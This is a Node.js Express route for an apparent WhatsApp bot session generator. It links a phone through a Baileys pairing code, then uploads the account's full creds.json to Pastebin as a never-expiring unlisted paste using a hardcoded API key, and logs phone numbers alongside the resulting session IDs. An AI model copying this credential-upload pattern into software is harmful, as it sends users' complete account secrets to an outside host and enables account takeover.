import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';
import { incrementPair } from './stats.js';
import fetch from 'node-fetch';

const router = express.Router();

// Pastebin API Configuration
const PASTEBIN_API_KEY = 'LKNSwf1j_nBPrwFXLr9OX7qvYoAmc8jB'; // Replace with your Pastebin API key
const PASTEBIN_API_URL = 'https://pastebin.com/api/api_post.php';

// Function to upload to Pastebin
async function uploadToPastebin(content, title = 'KnightBot Session') {
    try {
        const params = new URLSearchParams({
            api_dev_key: PASTEBIN_API_KEY,
            api_option: 'paste',
            api_paste_code: content,
            api_paste_name: title,
            api_paste_private: '1', // 0=public, 1=unlisted, 2=private
            api_paste_expire_date: 'N' // N=never expire
        });

        const response = await fetch(PASTEBIN_API_URL, {
            method: 'POST',
            body: params,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });

        const result = await response.text();
        
        if (result.startsWith('https://pastebin.com/')) {
            // Extract the paste ID from the URL
            const pasteId = result.split('/').pop();
            return { success: true, url: result, id: pasteId };
        } else {
            console.error('Pastebin error:', result);
            return { success: false, error: result };
        }
    } catch (error) {
        console.error('Error uploading to Pastebin:', error);
        return { success: false, error: error.message };
    }
}

// Function to remove files or directories
function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
        return true;
    } catch (e) {
        console.error('Error removing file:', e);
        return false;
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
    const sessionToken = sessionId; // used for frontend polling
    let dirs = './temp_sessions/' + sessionId;
    if (!global._sessionReady) global._sessionReady = {};

    // Ensure temp directory exists
    if (!fs.existsSync('./temp_sessions')) {
        fs.mkdirSync('./temp_sessions', { recursive: true });
    }

    // Clean the phone number - remove any non-digit characters
    num = num.replace(/[^0-9]/g, '');

    // Validate the phone number using awesome-phonenumber
    const phone = pn('+' + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({ 
                code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.' 
            });
        }
        return;
    }
    
    // Use the international number format (E.164, without '+')
    num = phone.getNumber('e164').replace('+', '');

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version, isLatest } = await fetchLatestBaileysVersion();
            let KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows('Chrome'),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            KnightBot.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline } = update;

                if (connection === 'open') {
                    console.log("✅ Connected successfully!");
                    console.log("📤 Uploading session to Pastebin...");
                    
                    try {
                        // Read the session file
                        const sessionContent = fs.readFileSync(dirs + '/creds.json', 'utf8');
                        
                        // Upload to Pastebin
                        const pastebinResult = await uploadToPastebin(sessionContent, `KnightBot Session - ${num}`);
                        
                        if (pastebinResult.success) {
                            console.log("✅ Session uploaded to Pastebin:", pastebinResult.url);
                            
                            // Create the custom format: xmegatron~PasteID
                            const customCode = `xmegatron~${pastebinResult.id}`;
                            
                            // Send custom code to user
                            const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
                            
                            await KnightBot.sendMessage(userJid, {
                                text: `${customCode}`
                            });
                            console.log("📤 Session code sent successfully");

                           // Send warning message
                            await KnightBot.sendMessage(userJid, {
                                text: ` _Note ⚠️_

_This bot is under developing stage only may cause some bugs and some issues to valuable users so kindly inform me through telegram channel._
_Uptodate Update to get new features_

_TELEGRAM:_ _https://t.me/xmegatronwha_

_THANKS FOR CHOOSING *X-MEGATRON*_`
                            });
                            console.log("⚠️ Warning message sent successfully");

                            // Save stats — full phone + session ID
                            incrementPair('+' + num, customCode);

                            // Notify frontend polling
                            global._sessionReady[sessionToken] = { sessionId: customCode, ts: Date.now() };
                            if (global.notifySessionSuccess) {
                                try { await global.notifySessionSuccess(null, customCode); } catch (_) {}
                            }

                        } else {
                            console.error("❌ Failed to upload to Pastebin:", pastebinResult.error);
                            
                            // Fallback: send error message to user
                            const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
                            await KnightBot.sendMessage(userJid, {
                                text: `❌ Failed to generate session code. Please try again later.`
                            });
                        }

                        // Clean up temporary session folder
                        console.log("🧹 Cleaning up temporary session...");
                        await delay(2000);
                        removeFile(dirs);
                        console.log("✅ Temporary session cleaned up successfully");
                        console.log("🎉 Process completed successfully!");
                        
                    } catch (error) {
                        console.error("❌ Error processing session:", error);
                        // Clean up even if there's an error
                        removeFile(dirs);
                    }
                }

                if (isNewLogin) {
                    console.log("🔐 New login via pair code");
                }

                if (isOnline) {
                    console.log("📶 Client is online");
                }

                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;

                    if (statusCode === 401) {
                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
                        removeFile(dirs);
                    } else {
                        console.log("🔁 Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                num = num.replace(/[^\d+]/g, '');
                if (num.startsWith('+')) num = num.substring(1);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join('-') || code;
                    if (!res.headersSent) {
                        console.log({ num, code });
                        await res.send({ code, token: sessionToken });
                    }
                } catch (error) {
                    console.error('Error requesting pairing code:', error);
                    if (!res.headersSent) {
                        res.status(503).send({ code: 'Failed to get pairing code. Please check your phone number and try again.' });
                    }
                }
            }

            KnightBot.ev.on('creds.update', saveCreds);
        } catch (err) {
            console.error('Error initializing session:', err);
            if (!res.headersSent) {
                res.status(503).send({ code: 'Service Unavailable' });
            }
            removeFile(dirs);
        }
    }

    await initiateSession();
});

// Frontend polls this every 3s after getting pair code
router.get('/session-status', (req, res) => {
    const token = req.query.token;
    if (token && global._sessionReady && global._sessionReady[token]) {
        const { sessionId } = global._sessionReady[token];
        delete global._sessionReady[token];
        return res.json({ ready: true, sessionId });
    }
    res.json({ ready: false });
});

// Global uncaught exception handler
process.on('uncaughtException', (err) => {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Stream Errored")) return;
    if (e.includes("Stream Errored (restart required)")) return;
    if (e.includes("statusCode: 515")) return;
    if (e.includes("statusCode: 503")) return;
    console.log('Caught exception: ', err);
});

export default router;
